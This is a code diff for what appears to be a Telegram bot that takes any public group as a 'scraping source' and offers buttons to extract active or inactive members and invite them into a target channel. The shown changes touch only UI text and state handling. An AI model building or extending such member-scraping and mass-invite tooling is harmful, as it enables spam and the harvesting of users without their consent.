+        # Capture the scraping source (This supports any public group)
         await db.set_target_data(user_id, source=input_text)
         await db.update_state(user_id, "AWAITING_SEGMENT")
         
-        # Deploy the Segment Selection Interface
+        # Deploy the Segment Selection Interface (Inline Buttons)
         markup = bot_types.InlineKeyboardMarkup()
         markup.row(
             bot_types.InlineKeyboardButton("🔥 Invite Active", callback_data="select_segment_active"),
             bot_types.InlineKeyboardButton("💤 Invite Inactive", callback_data="select_segment_inactive")
         )
         
+        # Retrieve target for the confirmation UI
+        target_name = user_data.get('target_channel', 'Unknown')
+        
         config_ui = (
             f"📥 <b>Source Group Locked</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"📍 <b>Origin:</b> <code>{input_text}</code>\n"
-            f"🎯 <b>Target:</b> <code>{user_data['target_channel']}</code>\n\n"
-            f"🛠️ <b>Final Step:</b> Select the user segment you wish to extract from the source group."
+            f"🎯 <b>Target:</b> <code>{target_name}</code>\n\n"
+            f"🛠️ <b>Final Step:</b> Select the user segment you wish to extract from the source."
         )
         
         await bot.send_message(m.chat.id, config_ui, parse_mode="HTML", reply_markup=markup)
-
 # =========================================================================
 # --- 8. THE DYNAMIC BRIDGE & WORKER ENGINE (TITAN-ASYNC V8.8) ---
 # =========================================================================
